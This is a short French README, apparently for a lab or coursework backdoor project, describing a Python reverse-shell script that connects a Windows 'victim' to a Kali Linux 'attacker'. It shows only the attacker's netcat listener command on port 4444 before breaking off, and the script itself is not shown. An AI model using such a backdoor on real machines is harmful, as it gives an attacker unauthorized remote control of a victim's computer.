#  Sujet 3 – Backdoor (Reverse Shell)

Ce script Python permet d'établir une connexion reverse shell entre une machine Windows (victime) et Kali Linux (attaquant).

##  Utilisation

### Côté Kali (attaquant)
Démarrer l'écoute avec Netcat :

```bash
nc -nlvp 4444

